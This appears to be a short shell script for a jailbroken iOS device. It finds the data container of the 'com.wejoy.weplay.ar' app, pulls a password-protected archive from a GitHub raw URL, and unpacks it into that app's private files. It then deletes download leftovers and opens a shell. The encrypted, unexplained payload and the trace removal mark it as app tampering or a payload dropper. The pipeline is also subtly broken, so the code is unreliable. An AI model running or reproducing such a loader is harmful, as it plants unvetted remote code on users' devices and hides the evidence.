
echo "123456"
cd $home/../../../private/var/mobile/Containers/Data/Application
weJoy=$(grep -rl --include=".com.apple.mobile_container_manager.metadata.plist" "com.wejoy.weplay.ar" .| cut -d/ -f2 | sort -u)
if [ $? -eq 0 ]; then
    echo $weJoy
    cd $weJoy
 
 wget --no-cache -qO- https://raw.githubusercontent.com/codecpacka/scripts/refs/heads/main/Resources/eav_driver.7z | 7z x eav_driver.7z -pRats@9033 -aoa
 #shred -u -z -f *.7z 
 rm -f *wget* 
else
echo "App not installed please try after installing the App" 

fi
echo "6566"


echo "suer"
$SHELL

